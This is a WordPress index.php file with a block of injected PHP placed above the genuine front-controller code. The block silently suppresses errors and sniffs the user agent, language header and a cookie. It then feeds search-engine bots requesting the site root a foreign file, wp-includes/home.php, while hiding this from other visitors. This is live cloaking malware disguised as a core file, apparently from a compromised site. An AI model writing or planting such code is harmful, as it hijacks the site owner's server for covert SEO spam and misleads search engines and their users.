<?php
error_reporting(0);
$s_ref = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];

if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/'){   
    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    if(strpos($accept_lang,'zh')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['az']=='lp'){setcookie('az','lp',time()+3600*7200); echo ' '; exit;}
    include('wp-includes/home.php');
    exit;

}


/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

